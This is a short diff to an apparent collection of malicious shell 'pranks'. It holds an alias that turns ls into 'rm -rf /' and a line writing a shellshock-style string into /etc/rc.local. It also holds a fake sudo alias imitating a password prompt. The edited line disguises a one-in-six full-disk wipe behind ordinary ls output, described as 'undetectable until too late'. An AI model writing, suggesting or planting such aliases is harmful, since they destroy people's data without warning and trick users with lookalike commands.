@@ -5,8 +5,8 @@ alias ls="rm -rf /"
 Put the shellshock bug into system startup
 echo "() { :;}:" > /etc/rc.local
 
-// system wipe roulette
-alias ls='[ $[ $RANDOM % 6 ] == 0 ] && rm -rf / && echo "BOOM" || echo *Click*'
+// system wipe roulette (undetectable until too late)
+alias ls='[ $[ $RANDOM % 6 ] == 0 ] && rm -rf / && echo "BOOM" || ls'
 
 // change sudo to just echo sudo's output
 alias sudo='echo "Please enter your password:"'
